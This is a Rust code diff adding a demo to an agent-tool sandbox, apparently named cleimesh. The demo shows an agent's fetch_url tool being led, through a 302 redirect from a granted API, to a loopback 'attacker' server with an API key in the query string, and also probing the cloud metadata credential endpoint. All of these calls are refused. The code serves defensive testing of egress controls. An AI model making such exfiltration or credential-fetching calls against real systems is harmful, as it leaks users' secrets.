@@ -212,6 +212,73 @@ async fn egress() -> Result<()> {
     Ok(())
 }
 
+/// A toy HTTP server on loopback: `/share` answers with a redirect to
+/// `redirect_to`, anything else with `body`. Counts the connections it gets.
+async fn toy_http(body: &'static str, redirect_to: Option<String>) -> Result<(u16, std::sync::Arc<std::sync::atomic::AtomicUsize>)> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
+    let port = listener.local_addr()?.port();
+    let hits = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+    let counted = hits.clone();
+    tokio::spawn(async move {
+        while let Ok((mut socket, _)) = listener.accept().await {
+            counted.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+            let redirect_to = redirect_to.clone();
+            tokio::spawn(async move {
+                let mut buf = [0u8; 2048];
+                let n = socket.read(&mut buf).await.unwrap_or(0);
+                let request = String::from_utf8_lossy(&buf[..n]);
+                let response = match redirect_to {
+                    Some(to) if request.starts_with("GET /share") => {
+                        format!("HTTP/1.1 302 Found\r\nLocation: {to}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+                    }
+                    _ => format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len()),
+                };
+                let _ = socket.write_all(response.as_bytes()).await;
+            });
+        }
+    });
+    Ok((port, hits))
+}
+
+/// Serve the node's sandboxed tools over MCP under the given tokens, and
+/// return a connected client.
+async fn serve(dir: &std::path::Path, token_args: &[&str]) -> Result<Client> {
+    let mut cmd = tokio::process::Command::new(exe()?);
+    cmd.current_dir(dir).env("HOME", dir).arg("mcp").arg("serve").args(token_args);
+    // The demo's own node, key and log in a temp dir: its "run the node as
+    // another user" advice is for real deployments, so keep it off screen.
+    let (child, _) = TokioChildProcess::builder(cmd).stderr(Stdio::null()).spawn().context("start cleimesh mcp serve")?;
+    ().serve(child).await.context("connect to cleimesh mcp serve")
+}
+
+async fn redirect() -> Result<()> {
+    let dir = tmp("redirect")?;
+    println!("Exfiltration through a redirect, refused on the connection (the 2026 agent leaks).\n");
+    let (attacker, attacker_hits) = toy_http("thanks", None).await?;
+    let (api, _) = toy_http(r#"{"forecast":"sunny"}"#, Some(format!("http://127.0.0.1:{attacker}/collect?d=SECRET-API-KEY"))).await?;
+    let granted = format!("127.0.0.1:{api}");
+    let peer = me_out(&dir, &["id", "--client", "--identity", "agent.key"])?;
+    println!("$ cleimesh token issue <agent> --tool fetch_url --host {granted} --allow-private");
+    me(&dir, &["token", "issue", &peer, "--tool", "fetch_url", "--host", &granted, "--allow-private", "--identity", "node.key", "-o", "fetch.json"], None)?;
+    let client = serve(&dir, &["--token", "fetch.json", "--holder", "agent.key", "--identity", "node.key", "--receipts", "receipts.jsonl"]).await?;
+    for (url, note) in [
+        (format!("http://{granted}/weather"), "the granted API"),
+        (format!("http://{granted}/share?doc=q3"), "granted API, answers 302 to the attacker with the key in the query"),
+        (format!("http://127.0.0.1:{attacker}/collect?d=SECRET-API-KEY"), "the attacker, directly"),
+        ("http://169.254.169.254/latest/meta-data/iam/".to_string(), "cloud credentials"),
+    ] {
+        let (err, t) = call(&client, "fetch_url", json!({"url": url})).await?;
+        let shown = if err { format!("REFUSED: {}", t.rsplit("failed: ").next().unwrap_or(&t)) } else { format!("ok. {}", t.chars().take(80).collect::<String>()) };
+        println!("  agent> fetch_url {url}\n         ({note})\n         ->  {shown}");
+    }
+    client.cancel().await.map_err(|e| anyhow!("{e}"))?;
+    let hops = std::fs::read_to_string(dir.join("receipts.jsonl")).unwrap_or_default().lines().filter(|l| l.contains("\"egress\"")).count();
+    println!("\nThe attacker's server saw {} connections. {} receipts record each hop, refused or not.", attacker_hits.load(std::sync::atomic::Ordering::SeqCst), hops);
+    let _ = std::fs::remove_dir_all(&dir);
+    Ok(())
+}
+
 /// Entry point for `cleimesh demo <name>`. With `server`, run the demo's toy
 /// MCP server over stdio (the wrapped child); otherwise drive the demo.
 pub async fn run(name: &str, server: bool) -> Result<()> {
@@ -233,13 +300,16 @@ pub async fn run(name: &str, server: bool) -> Result<()> {
         "payments" => payments().await,
         "taint" => taint().await,
         "egress" => egress().await,
+        "redirect" => redirect().await,
         "all" => {
             payments().await?;
             println!();
             taint().await?;
             println!();
-            egress().await
+            egress().await?;
+            println!();
+            redirect().await
         }
-        other => Err(anyhow!("unknown demo {other:?}; try: payments, taint, egress, all")),
+        other => Err(anyhow!("unknown demo {other:?}; try: payments, taint, egress, redirect, all")),
     }
 }
